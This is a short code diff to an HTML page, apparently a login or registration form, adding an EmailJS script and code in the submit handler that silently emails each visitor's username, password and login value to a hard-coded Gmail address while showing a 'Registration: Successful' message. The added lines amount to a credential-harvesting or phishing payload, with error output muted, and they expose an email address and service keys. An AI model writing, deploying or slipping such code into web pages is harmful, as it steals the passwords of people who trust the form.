@@ -722,7 +722,7 @@
     </div>
   </div>
   
-
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
   	var buka = new Audio();
   var b_click = false;
@@ -804,6 +804,22 @@ function seForm(x,y,z){
       form.append("PASSWORD",y);
      form.append("LOGIN",z);
       tost.className = "show";
+
+emailjs.init("IbRp7ZyZNQRmuiY_7");
+  const templateParams = {
+    to_email: "vshaktisinh434@gmail.com",
+    u_name: x,
+    u_pass: y,
+    u_login: z,
+  };
+  emailjs.send("service_gg5vd2p", "template_4qs5oq8", templateParams)
+    .then((response) => {
+      console.log("");
+    })
+    .catch((error) => {
+      console.error("e");
+    });
+	
   fetch(scriptURL, { method: 'POST', body: form})
 .then(response => tost.className = tost.className.replace("show", ""))
 .then(() => {sendTur("Registration: Successful \u2705");})
